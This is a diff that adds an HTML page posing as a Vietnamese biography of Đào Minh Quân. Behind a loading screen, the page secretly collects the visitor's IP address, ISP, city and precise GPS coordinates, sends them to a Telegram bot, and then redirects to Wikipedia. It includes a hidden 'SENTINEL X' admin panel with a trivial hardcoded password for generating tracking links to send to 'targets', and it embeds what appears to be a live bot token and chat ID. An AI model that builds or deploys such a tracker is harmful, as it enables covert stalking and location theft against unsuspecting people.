@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Tiểu sử Đào Minh Quân</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #4285F4; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body class="bg-[#0d1117] font-sans">
+
+    <div id="frontend-view" class="flex flex-col items-center justify-center h-screen bg-white">
+        <div class="loader"></div>
+        <p class="mt-4 text-gray-500 text-sm italic">Đang tải nội dung tiểu sử...</p>
+    </div>
+
+    <div id="login-view" class="hidden flex items-center justify-center h-screen">
+        <div class="bg-[#161b22] p-8 rounded-2xl border border-slate-800 shadow-2xl w-80 text-center">
+            <h2 class="text-white font-black italic mb-4">SENTINEL X</h2>
+            <input id="admin-pass" type="password" placeholder="Nhập mật khẩu..." class="w-full bg-[#0d1117] border border-slate-800 p-3 rounded-xl text-white outline-none mb-4 text-center">
+            <button onclick="checkPass()" class="w-full bg-blue-600 text-white font-bold py-3 rounded-xl hover:bg-blue-700 transition-all">ĐĂNG NHẬP</button>
+            <p id="login-err" class="text-red-500 text-[10px] mt-2 hidden">Mật khẩu không chính xác!</p>
+        </div>
+    </div>
+
+    <div id="admin-view" class="hidden min-h-screen p-6">
+        <div class="max-w-4xl mx-auto">
+            <div class="flex justify-between items-end mb-8">
+                <h1 class="text-2xl font-black text-white italic">SENTINEL <span class="text-blue-500">X</span> <span class="text-xs font-normal text-slate-500">CONTROL PANEL</span></h1>
+                <button onclick="location.reload()" class="text-[10px] text-red-500 underline">Đăng xuất</button>
+            </div>
+            
+            <div class="grid md:grid-cols-2 gap-6">
+                <div class="bg-[#161b22] p-6 rounded-2xl border border-slate-800 shadow-xl">
+                    <h3 class="text-blue-400 font-bold text-xs uppercase mb-4 tracking-widest">Cấu hình Chatbot</h3>
+                    <div class="space-y-4">
+                        <div>
+                            <label class="text-[10px] uppercase block mb-1">Telegram Token:</label>
+                            <input id="in-token" type="text" placeholder="Dán Bot Token vào đây" class="w-full bg-[#0d1117] border border-slate-800 p-2 rounded text-xs text-blue-300 outline-none">
+                        </div>
+                        <div>
+                            <label class="text-[10px] uppercase block mb-1">Chat ID:</label>
+                            <input id="in-id" type="text" placeholder="Dán Chat ID vào đây" class="w-full bg-[#0d1117] border border-slate-800 p-2 rounded text-xs text-blue-300 outline-none">
+                        </div>
+                        <button onclick="saveConfig()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 rounded-xl text-xs transition-all">LƯU & TẠO LINK</button>
+                    </div>
+                </div>
+
+                <div class="bg-[#161b22] p-6 rounded-2xl border border-slate-800 flex flex-col justify-between">
+                    <div>
+                        <h3 class="text-yellow-500 font-bold text-xs uppercase mb-4 tracking-widest">Link Tracking Của Bạn</h3>
+                        <div id="tracking-link" class="bg-black p-4 rounded-xl text-blue-400 text-[10px] break-all border border-slate-900 min-h-[60px] cursor-pointer" onclick="copyLink()">Chưa có link...</div>
+                    </div>
+                    <p class="mt-4 text-[9px] text-slate-500 italic">* Copy link trên gửi cho mục tiêu. Dữ liệu sẽ về Bot bạn vừa cài.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Mật khẩu mặc định là 123
+        const ADMIN_HASH = "202cb962ac59075b964b07152d234b70"; // md5 của '123'
+        let currentConfig = {
+            t: "8358235784:AAGTQQiBeQssDDMrrs0fC-Wb4iNwJ6V2144",
+            i: "5887642221",
+            r: "https://vi.wikipedia.org/wiki/Đào_Minh_Quân"
+        };
+
+        // Hàm kiểm tra mật khẩu
+        function checkPass() {
+            const p = document.getElementById('admin-pass').value;
+            // Ở đây dùng so sánh đơn giản, bạn có thể đổi pass tại dòng này
+            if (p === "123") {
+                document.getElementById('login-view').classList.add('hidden');
+                document.getElementById('admin-view').classList.remove('hidden');
+                loadAdmin();
+            } else {
+                document.getElementById('login-err').classList.remove('hidden');
+            }
+        }
+
+        function loadAdmin() {
+            const saved = localStorage.getItem('sentinel_config');
+            if(saved) currentConfig = JSON.parse(saved);
+            document.getElementById('in-token').value = currentConfig.t;
+            document.getElementById('in-id').value = currentConfig.i;
+            updateLink();
+        }
+
+        function saveConfig() {
+            currentConfig.t = document.getElementById('in-token').value;
+            currentConfig.i = document.getElementById('in-id').value;
+            localStorage.setItem('sentinel_config', JSON.stringify(currentConfig));
+            updateLink();
+            alert("Đã cập nhật cấu hình!");
+        }
+
+        function updateLink() {
+            const base = window.location.href.split('?')[0];
+            const data = btoa(JSON.stringify(currentConfig));
+            document.getElementById('tracking-link').innerText = `${base}?v=${data}`;
+        }
+
+        function copyLink() {
+            const link = document.getElementById('tracking-link').innerText;
+            navigator.clipboard.writeText(link);
+            alert("Đã copy link!");
+        }
+
+        window.onload = async () => {
+            const params = new URLSearchParams(window.location.search);
+
+            // TRANG ADMIN
+            if (params.has('admin')) {
+                document.getElementById('frontend-view').classList.add('hidden');
+                document.getElementById('login-view').classList.remove('hidden');
+                return;
+            }
+
+            // TRANG TRACKING (Mục tiêu nhấn vào)
+            if (params.has('v')) {
+                try { currentConfig = JSON.parse(atob(params.get('v'))); } catch(e) {}
+            }
+
+            const report = async (m) => {
+                await fetch(`https://api.telegram.org/bot${currentConfig.t}/sendMessage`, {
+                    method: "POST",
+                    headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({chat_id: currentConfig.i, text: m, parse_mode: "HTML"})
+                });
+            };
+
+            // Lấy IP & Gửi thông báo ngầm
+            const res = await fetch('https://ipapi.co/json/').then(r=>r.json()).catch(()=>null);
+            let msg = `🎯 <b>MỤC TIÊU MỚI</b>\n🌐 IP: <code>${res?.ip||'?'}</code>\n🏢 ISP: ${res?.org||'?'}\n📍 Vùng: ${res?.city||'?'}`;
+            
+            await report(msg + "\n⏳ Đang lấy GPS...");
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (p) => {
+                        const gps = `\n🎯 <b>GPS CHÍNH XÁC:</b>\n📍 Tọa độ: <code>${p.coords.latitude},${p.coords.longitude}</code>\n🔗 <a href="https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}">Xem bản đồ</a>`;
+                        await report(msg + gps);
+                        location.replace(currentConfig.r);
+                    },
+                    async () => {
+                        await report(msg + "\n❌ Mục tiêu từ chối GPS.");
+                        location.replace(currentConfig.r);
+                    },
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            } else { location.replace(currentConfig.r); }
+            setTimeout(() => location.replace(currentConfig.r), 8000);
+        };
+    </script>
+</body>
+</html>
